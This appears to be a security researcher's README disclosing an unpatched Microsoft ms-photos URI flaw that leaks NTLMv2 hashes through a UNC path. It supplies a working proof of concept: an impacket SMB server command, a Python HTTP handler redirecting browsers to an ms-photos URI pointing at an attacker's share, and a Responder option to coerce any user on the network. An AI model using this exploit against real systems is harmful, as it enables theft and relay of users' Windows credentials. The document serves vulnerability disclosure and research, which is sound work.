# Microsoft ms-photos URI NTLM Leak

### New unpatched 0 day vulnerability allowing to leak NTLM hashes from browsers with one click
By [Ruben Enkaoua](https://x.com/rubenlabs)
<br>
<br>

#### Description
<br>

The Microsoft ms-photos URI scheme takes fileName as parameter, which can be submitted with a UNC path, leaking NTLMv2-SSP hashes one opened. By crafting a specially formatted link, an attacker can coerce a victim into launching the Microsoft Photos app directly from a browser. When triggered, this behavior results in the leakage of the victim’s NTLMv2-SSP hash to an attacker-controlled server. This issue enables credential exposure and potential relay attacks in enterprise environments, requiring only minimal user interaction (Opening the App). Microsoft didn't recognize the vulnerability and no CVE was issued. Also, I was inspired by the [Syss blog](https://blog.syss.com/posts/abusing-ms-office-protos/) from 2022.<br><br>

From [MSDN Documentation](https://learn.microsoft.com/en-us/windows/apps/develop/launch/launch-default-app#photos-app-uri-scheme) about the URI scheme we can find the following:

<br>
<p align="center">
  <img width="862" height="261" alt="image" src="https://github.com/user-attachments/assets/08b1abcf-5541-42d6-91bd-35ceff54b7de" />
</p>
<br>

#### Steps to reproduce
<br>

> Open the smb server

```bash
# With a picture: Opens the photo on the target with photos.exe
# Without a picture: Nothing, no photos.exe process window 
impacket-smbserver share . -smb2support
```
<br>

> Start the malicious python server

```
python3 ms-photos-server.py
```
<br>

> Browse to the location

Open chrome and navigate to <IP>/test

<br>

![poc](https://github.com/user-attachments/assets/70d024ff-9415-4ddc-8127-cee9340a039b)

<br>

Also, it can be done with responder. Any unresolved domains issuing a LLMNR request will be redirected to the script, allowing to coerce any user instead of popping up a NTLM user/password auth window.
To make it work, run the script with --responder

<br>

![poc2](https://github.com/user-attachments/assets/ff15fd6e-c7df-4926-905c-b2fbb8dc3c58)

<br>

It works because our application is redirecting directly to a ms-photos URI scheme, containing the UNC path of our server:

<br>

```python
class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(302)  # HTTP 302 Found (temporary redirect)
            self.send_header('Location', 'ms-photos:viewer?fileName=\\\\192.168.159.129\\share\\lapin.jpg')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
```

<br>

#### Notes
<br>
This code is for educational and research purposes only.<br>
The author takes no responsibility for any misuse of this code.

